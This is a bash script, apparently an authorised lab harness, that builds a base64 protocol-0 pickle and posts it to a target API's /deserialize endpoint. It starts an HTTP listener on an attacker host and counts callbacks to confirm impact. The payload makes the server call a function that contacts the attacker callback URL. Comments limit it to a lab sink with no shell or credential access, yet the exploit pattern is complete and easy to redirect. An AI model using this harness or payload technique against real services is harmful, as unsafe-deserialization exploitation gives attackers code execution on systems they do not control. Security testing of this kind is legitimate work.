#!/usr/bin/env bash
set -Eeuo pipefail
VICTIM_HOST="${VICTIM_HOST:-<lab-ip>}"
ATTACKER_HOST="${ATTACKER_HOST:-<lab-ip>}"
TARGET="${TARGET:-http://${VICTIM_HOST}:18080}"
CALLBACK_PORT="${CALLBACK_PORT:-18181}"
RUN_ID="modern_api_deser_impact_wave3_$(date -u +%Y%m%dT%H%M%SZ)"
OUT="$HOME/<artifact-output-dir>/$RUN_ID"
mkdir -p "$OUT/http" "$OUT/payload" "$OUT/callback" "$OUT/victim"
OBS="$OUT/observations.jsonl"
SUMMARY="$OUT/summary.md"
: > "$OBS"
json_obs(){ python3 - "$OBS" "$@" <<'PY'
import json,sys,datetime
p=sys.argv[1]
d={'ts':datetime.datetime.now(datetime.UTC).isoformat().replace('+00:00','Z')}
for a in sys.argv[2:]:
    if '=' in a:
        k,v=a.split('=',1); d[k]=v
open(p,'a',encoding='utf-8').write(json.dumps(d,ensure_ascii=False)+'\n')
PY
}
status(){ curl -sS -o /dev/null -w '%{http_code}' --max-time 6 "$1" 2>/dev/null || echo 000; }
cleanup(){
  if [ -f "$OUT/callback/server.pid" ]; then kill "$(cat "$OUT/callback/server.pid")" 2>/dev/null || true; fi
}
trap cleanup EXIT
PRE=$(status "$TARGET/health")
json_obs category=health name=pre status="$PRE" target="$TARGET"
cat > "$SUMMARY" <<EOF
# Modern API Deserialization Impact Wave 3

target: $TARGET
attacker_callback: http://$ATTACKER_HOST:$CALLBACK_PORT/callback
pre_health: $PRE

EOF
# Start isolated callback listener on attacker-lab. This captures one host-only HTTP callback.
python3 - "$OUT/callback" "$CALLBACK_PORT" <<'PY' >"$OUT/callback/server.stdout" 2>"$OUT/callback/server.stderr" &
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
import json, sys, time
out=Path(sys.argv[1]); port=int(sys.argv[2]); out.mkdir(parents=True, exist_ok=True)
class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass
    def do_GET(self):
        rec={'ts':time.time(),'client':self.client_address[0],'path':self.path,'headers':dict(self.headers)}
        with (out/'requests.jsonl').open('a', encoding='utf-8') as f: f.write(json.dumps(rec)+'\n')
        body=b'CALLBACK_RECORDED_HERMES_LAB\n'
        self.send_response(200); self.send_header('Content-Type','text/plain'); self.send_header('Content-Length',str(len(body))); self.end_headers(); self.wfile.write(body)
ThreadingHTTPServer(('0.0.0.0', port), H).serve_forever()
PY
echo $! > "$OUT/callback/server.pid"
sleep 1
MARKER="DESER_IMPACT_${RUN_ID}"
CALLBACK_URL="http://${ATTACKER_HOST}:${CALLBACK_PORT}/callback?marker=${MARKER}"
PAYLOAD_JSON="$OUT/payload/deser_impact_payload.json"
python3 - "$PAYLOAD_JSON" "$MARKER" "$CALLBACK_URL" <<'PY'
import base64,json,sys
out, marker, callback = sys.argv[1:4]
# Protocol-0 pickle: call __main__.record_deser_impact(marker, callback_url) on the lab server.
# Lab-only bounded sink: no shell, no arbitrary command, no persistence, no credential access.
raw = b"c__main__\nrecord_deser_impact\n(" + ("V"+marker+"\n").encode() + ("V"+callback+"\n").encode() + b"tR."
open(out,'w',encoding='utf-8').write(json.dumps({'payload_b64':base64.b64encode(raw).decode(),'marker':marker,'callback_url':callback}, indent=2))
PY
RESP="$OUT/http/deserialize_response.json"
CODE=$(curl -sS --max-time 10 -o "$RESP" -w '%{http_code}' -H 'Content-Type: application/json' --data-binary "@$PAYLOAD_JSON" "$TARGET/deserialize" || echo 000)
LOG="$OUT/http/deser_log.json"
LOG_CODE=$(curl -sS --max-time 10 -o "$LOG" -w '%{http_code}' "$TARGET/deser-log" || echo 000)
sleep 1
CALLBACK_COUNT=$(python3 - "$OUT/callback/requests.jsonl" <<'PY'
import sys, pathlib
p=pathlib.Path(sys.argv[1])
print(0 if not p.exists() else sum(1 for _ in p.open(encoding='utf-8')))
PY
)
IMPACT=$(python3 - "$RESP" "$LOG" "$MARKER" <<'PY'
import json,sys
resp,log,marker=sys.argv[1:4]
blob=''
for p in (resp,log):
    try: blob += json.dumps(json.load(open(p)), sort_keys=True)
    except Exception: pass
print('yes' if marker in blob and 'marker_file' in blob and 'lab_only_deser_impact' in blob else 'no')
PY
)
MARKER_FILE=$(python3 - "$RESP" <<'PY'
import json,sys
try:
    data=json.load(open(sys.argv[1]))
    events=data.get('events') or []
    for ev in reversed(events):
        if ev.get('type') == 'lab_only_deser_impact':
            print(ev.get('marker_file','')); raise SystemExit
except Exception: pass
print('')
PY
)
json_obs category=deserialization_impact status="$CODE" log_status="$LOG_CODE" marker="$MARKER" impact_verified="$IMPACT" marker_file="$MARKER_FILE" callback_count="$CALLBACK_COUNT" payload="$PAYLOAD_JSON" response="$RESP" log="$LOG"
POST=$(status "$TARGET/health")
json_obs category=health name=post status="$POST" target="$TARGET"
{
  echo "deserialize_status: $CODE"
  echo "deser_log_status: $LOG_CODE"
  echo "impact_verified: $IMPACT"
  echo "marker: $MARKER"
  echo "marker_file: $MARKER_FILE"
  echo "callback_count: $CALLBACK_COUNT"
  echo "post_health: $POST"
  echo
  echo "## Boundaries"
  echo "lab-only unsafe deserialization; no shell; no arbitrary command; no persistence; no credential access; callback restricted to host-only lab IPs."
} >> "$SUMMARY"
echo "$OUT"
